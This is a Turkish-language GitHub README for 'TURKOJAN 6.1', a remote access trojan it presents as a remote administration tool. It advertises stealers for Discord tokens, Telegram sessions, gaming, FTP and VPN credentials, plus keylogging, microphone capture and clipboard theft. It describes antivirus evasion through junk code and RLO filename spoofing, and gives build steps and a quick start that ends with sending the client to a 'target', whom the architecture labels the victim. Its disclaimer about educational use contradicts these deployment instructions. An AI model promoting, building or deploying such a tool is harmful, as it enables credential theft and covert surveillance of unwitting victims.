<img width="1404" height="475" alt="Ekran görüntüsü 2026-07-05 203606" src="https://github.com/user-attachments/assets/7fc0e634-9faa-4715-905f-4aa4776932a3" />
<img width="590" height="86" alt="Ekran görüntüsü 2026-07-05 203434" src="https://github.com/user-attachments/assets/1c056db3-d297-487a-aeca-fc3de3753b54" />
<img width="1377" height="672" alt="Ekran görüntüsü 2026-07-05 203420" src="https://github.com/user-attachments/assets/c40f1b7a-6164-47e7-b622-ebdbf672af37" />
<img width="835" height="451" alt="Ekran görüntüsü 2026-07-05 203410" src="https://github.com/user-attachments/assets/7ed98a50-7164-4104-a543-b008a30db69d" />
# TURKOJAN
TURKOJAN 6.1 - Gelişmiş Uzaktan Erişim Aracı | Remote Administration Tool


# 🚀 TURKOJAN 6.1 - Gelişmiş Uzaktan Erişim Aracı



> **"Geçmişten Geleceğe, Yeniden Doğuş"**

TURKOJAN, ilk olarak 2003 yılında **Delphi** ile yazılmış efsanevi bir Türk Uzaktan Erişim Aracıdır. 1.0'dan 5.0'a kadar uzanan yolculuğun ardından, 2026 yılında **sıfırdan modern mimariyle** yeniden hayat buldu.

---

## 📖 Hikaye

2003'te bir grup Türk geliştirici tarafından başlatılan TURKOJAN, kısa sürede Türkiye'nin en popüler RAT tool'u haline geldi. 1.0'dan 5.0'a kadar sürekli geliştirildi, sayısız özellik eklendi. Ancak geliştiricilerin ortadan kaybolmasıyla proje yıllarca sessizliğe gömüldü.

**2026'da bu efsane yeniden doğdu.** TURKOJAN 6.0, modern **Go** ve **C#** teknolojileriyle sıfırdan yazıldı. Eski ruhunu koruyarak, günümüzün en güncel güvenlik önlemleri ve özellikleriyle donatıldı.

---

## 🎯 Özellikler

### 🔐 Güvenlik & Bağlantı
- **TLS 1.3** ile şifreli TCP bağlantısı
- **Secret Key** kimlik doğrulama
- **DPAPI** ile Windows şifre çözme
- Anti-Sandbox (analiz ortamı tespiti)
- Anti-TaskManager koruması

### 📊 Veri Toplama (15+ Servis)
- 💬 Discord Token Stealer
- 🎮 Steam, Riot Games, Battle.net, Epic Games
- 🎵 Spotify, Plex Media Server
- 🔐 ProtonVPN, Windscribe VPN
- 📁 FileZilla (FTP şifreleri)
- 📥 JDownloader, qBittorrent, uTorrent
- 🖥️ TeamViewer, AnyDesk
- ⛏️ Minecraft Launcher (token + UUID + OSINT)
- 📱 Telegram Session çalma


### 🛠️ Builder & Tools
- **Overlay Sistemi** - Bin dosyalarını exe'ye gömme
- **Junk Code** - AV atlatma için dosya şişirme
- **RLO Tool** - Dosya uzantısı gizleme (`.exe` → `.pdf` gibi)
- **GUI Builder** - Sürükle-bırak arayüz tasarımı
- **Checker Sistemi** - Token/hesap doğrulama (API ile)

### 🎙️ Kayıt & İzleme
- Mikrofon kaydı (WAV)
- Ekran görüntüsü (Base64 JPEG)
- Keylogger (özel tuş desteği)
- Clipboard çalma

### 🎨 Arayüz
- Modern karanlık tema
- Canlı sistem izleme (CPU, GPU, RAM, Disk)
- Client DataGridView
- TerminalForm (gelen verileri okuma)
- CheckerForm (token doğrulama)

### 🚀 Otomatik Güncelleme
- GitHub API entegrasyonu
- Yeni sürüm bildirimi
- Tek tıkla güncelleme

---



---

## 🏗️ Mimari
TURKOJAN/
├── 🖥️ C# Panel (Server)
│ ├── FUCK_CYFİRMA - Ana panel & listener
│ ├── Builder - Exe oluşturma
│ ├── Checker - Token doğrulama
│ ├── TerminalForm - Veri okuma
│ ├── GUI Builder - Arayüz tasarımı
│ ├── RLO Tools - Dosya gizleme
│ └── helpBOT - Yardım botu
│
├── 🔗 Go Client (Kurban)
│ └── birlesti.go - Stealer + bağlantı
│
└── 🔒 Güvenlik
├── TLS 1.3
├── AES-256-CBC
└── Secret Key auth

text

---

## 🚀 Hızlı Başlangıç

1. **Paneli başlat** - `TURKOJAN.exe`'yi aç
2. **Port gir** - Dinlenecek portu yaz (örn: 4444)
3. **Client oluştur** - Builder'dan exe'yi build et
4. **Gönder** - Client'ı hedefe yolla
5. **Bağlantıyı bekle** - Client bağlanınca panelde göreceksin

---

## 📦 Kurulum


# Repoyu klonla
git clone https://github.com/TURKOJAN-sys/TURKOJAN.git

# C# paneli aç (Visual Studio 2022+)
TURKOJAN.sln

# Go client'ı derle
cd client
go build -ldflags="-s -w -H windowsgui" -o client.exe birlesti.go
⚠️ Sorumluluk Reddi
Bu araç yalnızca eğitim ve yetkili güvenlik testleri amacıyla geliştirilmiştir. Yazar, bu aracın kötüye kullanımından doğacak hiçbir sorumluluğu kabul etmez.
